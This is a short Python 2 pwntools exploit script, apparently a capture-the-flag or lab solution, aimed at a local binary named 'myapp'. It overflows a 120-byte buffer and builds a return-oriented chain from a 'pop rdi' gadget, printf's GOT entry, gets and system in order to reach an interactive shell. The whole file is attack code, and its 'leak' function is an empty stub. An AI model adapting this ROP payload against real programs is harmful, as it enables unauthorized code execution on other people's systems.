#!/usr/bin/python2.7
from pwn import *

BUFFSIZE = 120

def setup():
    global binary
    global pop_rdi
    global got_addr
    global gets_addr
    global sys_addr

    binary = ELF("./myapp")
    r = ROP(binary)
    pop_rdi = p64(r.find_gadget(['pop rdi','ret']).address)
    got_addr = p64(binary.got['printf'])
    gets_addr = p64(binary.plt['gets'])
    sys_addr = p64(binary.plt['system'])
    

    p = process("./myapp")
    
    return p

def leak(proc):
    p = proc
    
def exploit(proc):
    
    p = proc

    print(p.recvline("? "))

    payload = "A"*BUFFSIZE
    payload += pop_rdi
    payload += got_addr
    payload += gets_addr
    payload += sys_addr

    p.sendline(payload)
    p.interactive()


def main():
    p = setup()
    exploit(p)

if __name__ == "__main__":
    main()
